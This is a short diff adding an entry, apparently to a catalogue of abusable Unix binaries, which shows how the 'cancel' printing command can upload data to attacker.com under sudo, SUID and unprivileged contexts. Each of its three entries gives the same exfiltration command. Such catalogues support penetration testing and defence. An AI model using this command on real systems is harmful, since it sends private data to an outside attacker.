@@ -1,0 +1,17 @@
+cancel
+======
+
+Upload
+------
+
+[Sudo]
+    cancel -h attacker.com:12345 -u DATA
+    Data is sent as a POST request along with other content.
+
+[SUID]
+    cancel -h attacker.com:12345 -u DATA
+    Data is sent as a POST request along with other content.
+
+[Unprivileged]
+    cancel -h attacker.com:12345 -u DATA
+    Data is sent as a POST request along with other content.
